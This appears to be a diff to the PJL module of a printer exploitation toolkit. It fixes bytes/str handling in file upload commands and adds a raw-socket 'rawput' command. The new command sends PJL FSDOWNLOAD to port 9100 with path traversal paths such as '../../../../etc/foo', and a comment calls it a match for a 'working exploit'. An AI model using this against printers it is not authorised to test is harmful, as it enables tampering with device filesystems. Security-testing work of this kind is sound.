@@ -24,9 +24,20 @@ class pjl(printer):
         footer = "@PJL ECHO " + token + c.EOL + c.EOL if wait else ""
         # send command to printer device
         try:
-            cmd_send = c.UEL + str_send + c.EOL + status + footer + c.UEL
+            # fallback: str_send may be str (normal commands) or bytes
+            # (binary payloads from put/append) -- handle both
+            if isinstance(str_send, bytes):
+                cmd_send = (
+                    c.UEL.encode()
+                    + str_send
+                    + (c.EOL + status + footer + c.UEL).encode()
+                )
+                log_line = str_send.decode("latin-1", errors="replace")
+            else:
+                cmd_send = c.UEL + str_send + c.EOL + status + footer + c.UEL
+                log_line = str_send
             # write to logfile
-            log().write(self.logfile, str_send + os.linesep)
+            log().write(self.logfile, log_line + os.linesep)
             # sent to printer
             self.send(cmd_send)
             # for commands that expect a response
@@ -247,30 +258,33 @@ class pjl(printer):
     # ------------------------[ put <local file> ]------------------------
     def put(self, path, data):
         lsize = len(data)
-        self.cmd(
+        header = (
             "@PJL FSDOWNLOAD FORMAT:BINARY SIZE="
             + str(lsize)
             + ' NAME="'
             + path
             + '"'
             + c.EOL
-            + data,
-            False,
         )
+        # fallback: data may be str (e.g. fuzzing) or bytes (real file
+        # contents) -- build the payload to match data's type either way
+        payload = header.encode() + data if isinstance(data, bytes) else header + data
+        self.cmd(payload, False)
 
     # ------------------------[ append <file> <string> ]------------------
     def append(self, path, data):
         lsize = len(data)
-        self.cmd(
+        header = (
             "@PJL FSAPPEND FORMAT:BINARY SIZE="
             + str(lsize)
             + ' NAME="'
             + path
             + '"'
             + c.EOL
-            + data,
-            False,
         )
+        # fallback: data may be str or bytes -- match types before concat
+        payload = header.encode() + data if isinstance(data, bytes) else header + data
+        self.cmd(payload, False)
 
     # ------------------------[ delete <file> ]---------------------------
     def delete(self, arg):
@@ -930,3 +944,82 @@ class pjl(printer):
                 val.replace("[buffer]", char * size), self.timeout * 10, False
             )
         self.cmd("@PJL ECHO")  # check if device is still reachable
+
+    # ====================================================================
+    # raw socket bypass for direct PJL FSDOWNLOAD
+    def raw_put(self, path, data, port=9100):
+        """Send file via raw socket, bypassing PRET's UEL/status/echo wrapper.
+        
+        Useful when path traversal or volume handling interferes with normal
+        put(). Sends PJL FSDOWNLOAD directly to printer port (default 9100).
+        No UEL framing, status messages, or echo replies.
+        
+        Args:
+            path (str): Remote path (can include traversal like
+                0:../../../../etc/foo -- use forward slashes)
+            data (bytes or str): File content to upload
+            port (int): Printer port (default 9100)
+        
+        Returns:
+            bool: True if send succeeded, False on error
+        """
+        try:
+            import socket
+            
+            # convert str data to bytes if needed
+            if isinstance(data, str):
+                data = data.encode()
+            
+            # build raw PJL FSDOWNLOAD command with proper line termination
+            cmd = f'@PJL FSDOWNLOAD NAME="{path}" SIZE={len(data)}\n'
+            
+            # send command + data atomically in one call (matching original working exploit)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((self.target, port))
+            sock.sendall(cmd.encode() + data)
+            sock.close()
+            
+            print(("[+] Sent " + str(len(data)) + " bytes via raw socket to " + 
+                   self.target + ":" + str(port)))
+            return True
+            
+        except Exception as e:
+            output().errmsg("Raw socket upload failed", e)
+            return False
+
+    # interactive command wrapper for raw_put
+    def do_rawput(self, arg):
+        "Upload file via raw socket (bypasses UEL wrapper):  rawput <local file> [remote path] [port]"
+        args = arg.split()
+        if not args:
+            args = [input("Local file: ")]
+        
+        lpath = args[0]
+        rpath = args[1] if len(args) > 1 else os.path.basename(lpath)
+        port = int(args[2]) if len(args) > 2 else 9100
+        
+        # read local file
+        data = file().read(lpath)
+        if data is None:
+            return
+        
+        # send via raw socket
+        if self.raw_put(rpath, data, port):
+            print(("File uploaded. Verify with: get " + rpath))
+            # some devices only commit a queued FSDOWNLOAD to persistent
+            # storage once the printer goes idle. give the device a moment
+            # to process the raw write, then cycle the connection.
+            try:
+                import time
+                self.chitchat("Flushing write to disk (waiting for device).", "")
+                time.sleep(1.5)  # give printer time to process raw write
+                self.do_reconnect()
+                self.chitchat("")  # newline after progress message
+            except Exception as e:
+                self.chitchat("")  # newline after progress message
+                output().errmsg("Reconnect failed", str(e))
+                print("(You can run 'reconnect' manually if needed)")
+        else:
+            print("Raw socket upload failed.")
+
+    # define alias
